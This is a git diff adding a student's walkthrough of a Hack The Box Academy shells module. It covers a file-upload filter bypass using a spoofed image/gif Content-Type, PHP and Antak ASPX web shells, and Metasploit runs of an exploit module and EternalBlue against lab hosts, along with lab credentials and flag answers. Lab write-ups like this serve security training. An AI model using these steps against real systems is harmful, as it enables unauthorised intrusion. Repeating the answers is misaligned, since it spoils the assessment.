@@ -306,8 +306,132 @@ go to URL -> [http://status.inlanefreight.local//files/Upload.aspx](http://statu
 
 #### Questions
 
-In the example shown, what must the Content-Type be changed to in order to successfully upload the web shell? (Format: .../... )
+1. In the example shown, what must the Content-Type be changed to in order to successfully upload the web shell? (Format: .../... )
+
+<mark style="color:red;">**image/gif**</mark>
+
+2. Use what you learned from the module to gain a web shell. What is the file name of the gif in the /images/vendor directory on the target? (Format: xxxx.gif)
+
+go to URL (generated IP)
+
+<figure><img src=".gitbook/assets/image (21).png" alt=""><figcaption></figcaption></figure>
+
+login (admin:admin) -> Devices -> Vendors
+
+* we can upload some files here
+
+Lets use WhiteWinterWolf webshell.php...
+
+* [https://github.com/WhiteWinterWolf/wwwolf-php-webshell/blob/master/webshell.php](https://github.com/WhiteWinterWolf/wwwolf-php-webshell/blob/master/webshell.php)
+
+<figure><img src=".gitbook/assets/image (22).png" alt=""><figcaption></figcaption></figure>
+
+* change Content-Type from app/x-php to **image/gif**
+* 2x Forward to upload it
+
+<figure><img src=".gitbook/assets/image (23).png" alt=""><figcaption></figcaption></figure>
+
+"Added new vendor webshell to Databse"
+
+lets look at uploaded file: URL -> [https://10.129.85.176/images/vendor/webshell.php](https://10.129.85.176/images/vendor/webshell.php)
+
+<figure><img src=".gitbook/assets/image (24).png" alt=""><figcaption></figcaption></figure>
+
+`ls`
+
+<figure><img src=".gitbook/assets/image (25).png" alt=""><figcaption></figcaption></figure>
 
 
 
-Use what you learned from the module to gain a web shell. What is the file name of the gif in the /images/vendor directory on the target? (Format: xxxx.gif)
+## Skills Assessment
+
+
+
+### Questions
+
+1. What is the hostname of Host-1? (Format: all lower case)
+
+`xfreerdp /v:10.129.109.218 /u:htb-student /p:HTB_@cademy_stdnt!`
+
+firefox (or any browser) -> status.inlanefreight.local
+
+`cp /usr/share/nishang/Antak-WebShell/antak.aspx /home/htb-student/Upload.aspx`
+
+`nano Upload.aspx` -> change user creds to tomcat:Tomcatadm
+
+upload file -> go to \\\files\upload.aspx -> login w creds
+
+`hostname`
+
+<figure><img src=".gitbook/assets/image (26).png" alt=""><figcaption></figcaption></figure>
+
+2. Exploit the target and gain a shell session. Submit the name of the folder located in C:\Shares\ (Format: all lower case)
+
+`dir c:\Shares`
+
+<figure><img src=".gitbook/assets/image (27).png" alt=""><figcaption></figcaption></figure>
+
+3. What distribution of Linux is running on Host-2? (Format: distro name, all lower case)
+
+<mark style="color:red;">**ubuntu**</mark>
+
+<figure><img src=".gitbook/assets/image (28).png" alt=""><figcaption></figcaption></figure>
+
+4. What language is the shell written in that gets uploaded when using the 50064.rb exploit?
+
+<mark style="color:red;">**php**</mark>
+
+5. Exploit the blog site and establish a shell session with the target OS. Submit the contents of /customscripts/flag.txt
+
+`msfconsole -q`
+
+`use 50064.rb`
+
+`set USERNAME admin`
+
+`set PASSWORD admin123!@#`
+
+`set VHOST blog.inlanefreight.local`
+
+`set RHOSTS blog.inlanefreight.local`
+
+`run`
+
+`cd /customscripts`
+
+`ls`
+
+`cat flag.txt`
+
+<figure><img src=".gitbook/assets/image (29).png" alt=""><figcaption></figcaption></figure>
+
+6. What is the hostname of Host-3?
+
+<figure><img src=".gitbook/assets/image (30).png" alt=""><figcaption></figcaption></figure>
+
+`nmap -sVC 172.16.1.13`
+
+<figure><img src=".gitbook/assets/image (31).png" alt=""><figcaption></figcaption></figure>
+
+7. Exploit and gain a shell session with Host-3. Then submit the contents of C:\Users\Administrator\Desktop\Skills-flag.txt
+
+`msfconsole -q`
+
+`search eternalblue`
+
+`use`&#x20;
+
+`set RHOSTS 172.16.1.13`
+
+`set LHOST` 172.16.1.5
+
+`run`
+
+`dir`
+
+`cd c:/users/Administrator/Desktop`
+
+`cat Skills-flag.txt`
+
+<figure><img src=".gitbook/assets/image (32).png" alt=""><figcaption></figcaption></figure>
+
